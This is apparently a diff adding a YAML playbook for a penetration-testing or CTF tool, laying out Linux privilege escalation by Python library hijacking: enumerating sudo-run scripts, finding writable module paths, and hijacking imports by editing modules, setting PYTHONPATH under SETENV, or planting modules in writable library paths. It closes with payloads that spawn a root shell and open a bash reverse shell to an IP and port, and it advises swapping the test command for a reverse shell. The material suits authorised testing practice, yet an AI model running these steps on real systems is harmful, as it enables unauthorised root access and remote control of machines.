@@ -1,0 +1,181 @@
+name: Linux Privilege Escalation - Python Library Hijacking
+
+steps:
+
+# =========================================================
+# [1] ENUMERATE PYTHON EXECUTION
+# =========================================================
+- title: Enumerate Python Execution
+  mode: enum
+  info: |
+    Identify Python scripts executed with elevated privileges.
+
+  entries:
+
+    - cmd: "sudo -l"
+      info: enumerate sudo permissions
+
+      look_for:
+        - "python"
+        - "SETENV"
+        - "NOPASSWD"
+
+    - cmd: "find / -name '*.py' 2>/dev/null"
+      info: enumerate Python scripts
+
+    - cmd: "ps aux | grep python"
+      info: identify running Python applications
+
+  notes:
+    - custom Python scripts are highest priority
+    - sudo Python execution is extremely dangerous
+    - imported modules become attack surface
+
+# =========================================================
+# [2] IDENTIFY IMPORTED MODULES
+# =========================================================
+- title: Identify Imported Modules
+  mode: enum
+  info: |
+    Review imported Python modules.
+
+  entries:
+
+    - cmd: "cat script.py"
+      info: inspect imported modules
+
+      look_for:
+        - "import"
+        - "from x import y"
+
+    - cmd: "python3 -c 'import MODULE; print(MODULE.__file__)'"
+      info: locate imported module path
+
+    - cmd: "python3 -c 'import sys; print(\"\\n\".join(sys.path))'"
+      info: inspect Python import order
+
+  notes:
+    - Python loads first matching module found
+    - writable paths are critical
+    - custom modules are commonly vulnerable
+
+# =========================================================
+# [3] CHECK WRITABLE MODULE PATHS
+# =========================================================
+- title: Check Writable Module Paths
+  mode: enum
+  info: |
+    Determine whether imported modules or library paths are writable.
+
+  entries:
+
+    - cmd: "ls -l /path/to/module.py"
+      info: inspect module permissions
+
+    - cmd: "ls -ld /path/to/python/libs/"
+      info: inspect library directory permissions
+
+      look_for:
+        - "world writable"
+        - "group writable"
+
+  notes:
+    - writable module = direct code execution
+    - writable library path = module hijacking opportunity
+
+# =========================================================
+# [4A] WRITABLE MODULE HIJACK
+# =========================================================
+- title: Writable Module Hijack
+  mode: chain
+  info: |
+    Modify imported module directly.
+
+  entries:
+
+    - cmd: "nano /path/to/module.py"
+      info: edit imported module
+
+    - cmd: "sudo /usr/bin/python3 script.py"
+      info: trigger execution
+
+    - cmd: "id"
+      info: verify privileges
+
+  notes:
+    - append payload instead of replacing code
+    - preserve application stability if possible
+    - replace id with reverse shell after validation
+
+# =========================================================
+# [4B] PYTHONPATH HIJACK
+# =========================================================
+- title: PYTHONPATH Hijack
+  mode: chain
+  info: |
+    Force Python to import attacker-controlled module.
+
+  entries:
+
+    - cmd: "sudo -l"
+      info: verify SETENV permissions
+
+      look_for:
+        - "SETENV"
+
+    - cmd: "nano /tmp/MODULE.py"
+      info: create malicious module
+
+    - cmd: "sudo PYTHONPATH=/tmp /usr/bin/python3 script.py"
+      info: trigger malicious import
+
+    - cmd: "id"
+      info: verify privileges
+
+  notes:
+    - malicious module name must match imported module
+    - PYTHONPATH overrides default import order
+    - requires SETENV permissions
+
+# =========================================================
+# [4C] LIBRARY PATH HIJACK
+# =========================================================
+- title: Library Path Hijack
+  mode: chain
+  info: |
+    Place malicious module inside writable Python library path.
+
+  entries:
+
+    - cmd: "nano /writable/path/MODULE.py"
+      info: create malicious module
+
+    - cmd: "sudo /usr/bin/python3 script.py"
+      info: trigger malicious import
+
+    - cmd: "id"
+      info: verify privileges
+
+  notes:
+    - attacker-controlled module loads before legitimate one
+    - module name must match imported dependency
+    - useful when PYTHONPATH is unavailable
+
+# =========================================================
+# [5] GENERIC PYTHON PAYLOADS
+# =========================================================
+- title: Generic Python Payloads
+  mode: manual
+  info: |
+    Minimal payloads commonly used during Python module hijacking.
+
+  entries:
+
+    - cmd: "import os; os.system('id')"
+      info: privilege validation
+
+    - cmd: "import os; os.system('/bin/bash')"
+      info: spawn shell
+
+    - cmd: "import os; os.system('bash -c \"bash -i >& /dev/tcp/IP/PORT 0>&1\"')"
+      info: reverse shell
